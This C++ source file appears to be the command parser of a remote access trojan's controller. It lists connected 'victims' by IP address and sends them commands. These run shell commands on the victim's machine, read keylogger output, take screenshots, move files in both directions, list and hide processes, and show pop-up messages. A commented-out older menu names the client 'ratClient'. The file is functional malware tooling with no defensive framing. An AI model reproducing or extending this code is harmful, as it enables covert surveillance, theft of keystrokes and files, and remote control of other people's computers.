#include "stdafx.h"
#include "Parser.h"

enum menu_items { $help, $man, $list, $connect, $disconnect, $user, $ps, $scp, $screenshot, $keylogger, $phide, $pop, UNKNOWN};

struct items
{
	char *name;
	enum menu_items id;
} items_list[] = {
	{ "$help", $help },
	{ "$man", $man },
	{ "$list", $list },
	{ "$connect", $connect },
	{ "$disconnect", $disconnect },
	{ "$user", $user },
	{ "$ps", $ps },
	{ "$scp", $scp },
	{ "$screenshot", $screenshot },
	{ "$keylogger", $keylogger },
	{ "$phide", $phide },
	{ "$pop", $pop },
};


Parser::Parser(){
	managementServer = (&server());
}


Parser::~Parser()
{
}

bool Parser::parseString(std::string inputString, char* recData) {
	if (!(inputString.empty())) {
		if (!(inputString.at(0) == '$')) {
			return parseCMD(inputString, recData);
		}
		else {
			return parseOp(inputString, recData);
		}
	}
	else return false;
}

bool Parser::parseOp(std::string inputString, char* recData) {
	std::unordered_map<std::string, victimData*>* currentVictims;

	std::string delimiter = " ";

	size_t pos = 0;
	std::string token;
	pos = inputString.find(delimiter);
	std::string operation = inputString.substr(0, pos);
	std::string args;
	if (!(strcmp(operation.c_str(), inputString.c_str()) == 0))
		args = inputString.substr(pos+ 1, inputString.length() - 1);
	else
		args = "";

	enum menu_items requestedOperation;
	struct items *choice = NULL;
	int i = 0;
	
	for (i = 0 , choice = NULL; i < sizeof items_list / sizeof(struct items); i++)
	{
		if (strcmp(operation.c_str(), items_list[i].name) == 0)
		{
			choice = items_list + i;
			break;
		}
	}
	requestedOperation = choice ? choice->id : UNKNOWN;
	if (requestedOperation == UNKNOWN) {
		if (!(currentConnection.sclient))
			return false;
		return parseCMD(inputString, recData);
	}
	switch (requestedOperation) {
		case $help:
			manual::showHelp();
			return true;
		case $man:
			return manual::showMan(args.c_str());
		case $list:
			if (!(managementServer)) {
				return false;
			}
			currentVictims = managementServer->getVictimsMap();
			if (!(currentVictims))
				return false;
			for (auto it = currentVictims->begin(); it != currentVictims->end(); ++it) {
				bool* isConnected_ptr = it->second->connected;
				bool isConnected = *isConnected_ptr;
				printf("ip:%s||info:%s||running:%s\n", it->first.c_str(), it->second->data, isConnected ? "true" : "false");
				//printf("\tconnected:%d\n", it->second->connected);
				//printf("\tconnected:%d\n", *it->second->connected);
				//printf("%s\t%d\n", it->second->data, it->second->connected);
				//std::cout << " " << (std::string) it->first << ":" << (char*)it->second->data << "\tconnected:" << (bool)it->second->connected << std::endl;
			}		
			return true;
			break;
		case $connect:
			//currentConnection->sclient = currentConnection->Tryconnect(args.c_str());
			if (!(currentConnection.Tryconnect(args.c_str())))
				return false;
			std::cout << "Connected to " << args.c_str();
			return true;
			break;
		case $disconnect:
			currentConnection.closeConnection();
			std::cout << "Disconnected";
			return true;
		case $user:
			if (!(currentConnection.sclient))
				return false;
			if (!(currentConnection.getUserName(recData))) {
				return false;
			}
			else {
				return true;
			}
			break;
		case $ps:
			if (!(currentConnection.sclient))
				return false;
			if (!(currentConnection.getPSList(recData))) {
				return false;
			}
			else {
				return true;
			}
			break;
		case $scp:
			if (!(currentConnection.sclient))
				return false;
			return parseScp(args, recData);
			/*
			printf("getFile!\n");
			printf("Input path:");
			scanf("%s", userInput);
			if (!(ratClient.getFile(*userInput))) {
				printf("getFile - something went wrong\n");
			}
			else {
				printf("getFile - successfully finished\n");
			}
			*/
		case $screenshot:
			if (!(currentConnection.sclient))
				return false;
			if (!(currentConnection.getScreenShot())) {
				return false;
			}
			else {
				return true;
			}
			break;
		case $keylogger:
			if (!(currentConnection.sclient))
				return false;
			if (!(currentConnection.getKeyBoard(recData))) {
				return false;
			}
			else {
				return true;
			}
		case $pop:
			if (!(currentConnection.sclient))
				return false;
			if (!(currentConnection.popMessage(args.c_str()))) {
				return false;
			}
			else {
				return true;
			}
		case $phide:
			if (!(currentConnection.sclient))
				return false;
			if (!(currentConnection.processHide(args.c_str()))) {
				return false;
			}
			else {
				return true;
			}
	}

}
/*
printf("Choose option:\n");
printf("1: run cmd command\n");
printf("2: get user name\n");
printf("3: get current processes\n");
printf("4: get keylogger (BUG)\n");
printf("5: get file\n");
printf("6: get screenshot\n");
scanf("%s", userOption);
if (strcmp(userOption, "1") == 0) {
	printf("RunCMD!\n");
	printf("Input command:");
	scanf(" %[^\n]s", userInput);
	if (!(ratClient.sendCMD(*userInput, recData))) {
		printf("sendCMD - something went wrong\n");
	}
	else {
		FILE *tmp_output_file = fopen("temp.tmp", "r");
		if (tmp_output_file == NULL) { printf("sendCMD - fopen - something went wrong\n"); }
		fseek(tmp_output_file, 0, SEEK_END);
		int lSize = ftell(tmp_output_file);
		rewind(tmp_output_file);
		char* file_content = new char[lSize];
		memset(recData, 0, BUFLEN);
		int result = fread(recData, 1, lSize, tmp_output_file);
		SetConsoleTextAttribute(hConsole, (FOREGROUND_GREEN | FOREGROUND_INTENSITY));
		printf("%s", recData);
		SetConsoleTextAttribute(hConsole, (FOREGROUND_GREEN));
		printf("sendCMD - successfully finished\n");
	}
	continue;
}
else if (strcmp(userOption, "2") == 0) {
	printf("getUserName!\n");
	if (!(ratClient.getUserName(recData))) {
		printf("getUserName - something went wrong\n");
	}
	else {
		SetConsoleTextAttribute(hConsole, (FOREGROUND_GREEN | FOREGROUND_INTENSITY));
		printf("%s\n", recData);
		SetConsoleTextAttribute(hConsole, (FOREGROUND_GREEN));
		printf("getUserName - successfully finished\n");
	}
	continue;
}
else if (strcmp(userOption, "3") == 0) {
	printf("getPSList!\n");
	if (!(ratClient.getPSList(recData))) {
		printf("getPSList - something went wrong\n");
	}
	else {
		SetConsoleTextAttribute(hConsole, (FOREGROUND_GREEN | FOREGROUND_INTENSITY));
		printf("%s\n", recData);
		SetConsoleTextAttribute(hConsole, (FOREGROUND_GREEN));
		printf("getPSList - successfully finished\n");
	}
	continue;
}
else if (strcmp(userOption, "4") == 0) {
	printf("getKeyBoard!\n");
	if (!(ratClient.getKeyBoard(recData))) {
		printf("getKeyBoard - something went wrong\n");
	}
	else {
		SetConsoleTextAttribute(hConsole, (FOREGROUND_GREEN | FOREGROUND_INTENSITY));
		printf("%s\n", recData);
		SetConsoleTextAttribute(hConsole, (FOREGROUND_GREEN));
		printf("getKeyBoard - successfully finished\n");
	}
	continue;
}
else if (strcmp(userOption, "5") == 0) {
	printf("getFile!\n");
	printf("Input path:");
	scanf("%s", userInput);
	if (!(ratClient.getFile(*userInput))) {
		printf("getFile - something went wrong\n");
	}
	else {
		printf("getFile - successfully finished\n");
	}
	continue;
}
else if (strcmp(userOption, "6") == 0) {
	printf("getScreenShot!\n");
	if (!(ratClient.getScreenShot())) {
		printf("getScreenShot - something went wrong\n");
	}
	else {
		printf("getScreenShot - successfully finished\n");
	}
	/*char *path = "screen.bmp";
	if (!(cclient.getFile(*path))) {
	printf("getFile - something went wrong\n");
	}
	else {
	printf("getFile - successfully finished\n");
	ShellExecute(0, 0, "screen.bmp", 0, 0, SW_SHOW);
	}
	
	continue;
}
else {
	continue;
}
	}
	*/


bool Parser::parseCMD(std::string inputString, char* recData) {
	if (!(currentConnection.sendCMD(*inputString.c_str(), recData))) {
		return false;
	}
	else {
		FILE *tmp_output_file = fopen("temp.tmp", "r");
		if (tmp_output_file == NULL) { 
			return false;
		}
		fseek(tmp_output_file, 0, SEEK_END);
		int lSize = ftell(tmp_output_file);
		rewind(tmp_output_file);
		char* file_content = new char[lSize];
		memset(recData, 0, BUFLEN);
		int result = fread(recData, 1, lSize, tmp_output_file);
		recData = file_content;
		return true;
	}
}
bool Parser::parseScp(std::string inputString, char* recData) {
	std::string delimiter = " ";

	size_t pos = 0;
	std::string token;
	pos = inputString.find(delimiter);
	std::string remotePath = inputString.substr(0, pos);
	std::string localPath;

	if (!(strcmp(remotePath.c_str(), inputString.c_str()) == 0))
		localPath = inputString.substr(pos + 1, inputString.length() - 1);
	else
		return false;
	// Download
	if (remotePath.at(0) == '@') {
		remotePath = remotePath.substr(1, remotePath.length() - 1);
		if (!(currentConnection.getFile(remotePath.c_str(), localPath.c_str()))) {
			return false;
		}
	}
	// Upload
	else {
		localPath.swap(remotePath);
		if (!(currentConnection.sendFile(remotePath.c_str(), localPath.c_str()))) {
			return false;
		}
	}
	return true;
}